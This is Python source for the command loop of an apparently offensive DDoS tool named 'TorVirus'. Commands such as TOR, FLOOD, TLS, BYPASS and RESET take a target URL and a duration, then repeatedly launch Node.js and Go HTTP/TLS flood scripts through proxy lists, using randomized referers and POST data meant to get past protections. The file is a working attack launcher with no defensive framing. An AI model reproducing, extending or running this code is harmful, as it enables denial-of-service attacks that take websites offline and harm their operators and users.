def main_loop():
    dis_menu()
    while True:
        user_input = input("root@torvirus#~ ").strip()
        if not user_input:
            continue
        parts = user_input.split()
        command = parts[0].upper()

        if command == "STATS":
            clr_csl()
            dis_dash()
            continue

        elif command == "LAYER7":
            load_ani("✨ Loading Layer 7 Methods ✨", 1.5)
            print(
                """
                     TOR  : TOR https://example.com 60
                     FLOOD: FLOOD https://example.com 60
                     HTTPX: HTTPX https://example.com 60
                     HTTPS: HTTPS https://example.com 60
                     RESET: RESET https://example.com 60
                     NOX  : NOX https://example.com 60"""
            )
            continue

        elif command in ["CLEAR", "CLS"]:
            load_ani("Purging Console", 1.5)
            dis_menu()
            continue

        elif command == "EXIT":
            load_ani("Exiting TorVirus", 1.5)
            ani_txt("👋 Goodbye, have a great day.", 0.02)
            t.sleep(1)
            s.exit(0)

        elif command == "TOR":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f'node bin/odd/.cache/TorXTor.js GET "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                    )
                    o.system(
                        f'node bin/odd/.cache/TorXTor.js POST "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "FLOOD":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"go run bin/odd/.cache/TorXHulk.go --site {host} --data GET"
                    )
                    o.system(
                        f"go run bin/odd/.cache/TorXCrash.go {host} 9999 get {max_time} nil"
                    )
                    o.system(
                        f"go run bin/odd/.cache/TorXHulk.go --site {host} --data POST"
                    )
                    o.system(
                        f"go run bin/odd/.cache/TorXCrash.go {host} 9999 POST {max_time} nil"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "TLS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/TorXTls.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "TLS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/TorXTls.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "NOX":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/NOX.js {host} {max_time} 20 90 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/NOX.js {host} {max_time} 20 90 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "HTTPS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/HTTPS.js POST {host} {max_time} 8 8 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/HTPPSV2.js GET {host} {max_time} 8 8 bin/odd/.cache/proxy.txt"
                    )

                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "BYPASS":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/TorXBypassV2.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    o.system(
                        f"node bin/odd/.cache/TorXBypass.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: BYPASS https://example.com 60")

        elif command == "RESET":
            try:
                host = parts[1]
                time = int(parts[2])
                max_time = 60
                start_time = t.time()

                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)

                while t.time() - start_time < time:
                    o.system(
                        f"node bin/odd/.cache/RESETV2.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt --full"
                    )
                    o.system(
                        f"node bin/odd/.cache/RESET.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt"
                    )
                    t.sleep(1)

            except IndexError:
                print("❌ Invalid Command. Usage: METHOD URL TIME")
                print("Example: TOR https://example.com 60")

        elif command == "PROXY":
            o.system("python3 bin/odd/.cache/scrape.py &")
            continue

        elif command == "UPDATE":
          o.system("git reset --hard HEAD && git pull origin main")
          continue

        elif command == "SETUP":
            o.system("sudo bash setup.sh &")
            continue

        elif command == "HELP":
            load_ani("Loading Help Interface", 1.5)
            print(
                """ 
                          HELP - For Assistance
             CLEAR - Clear Terminal
             """
            )

        else:
            print(f"❌ Command [ {command} ] not recognized. Please try again! 🚨")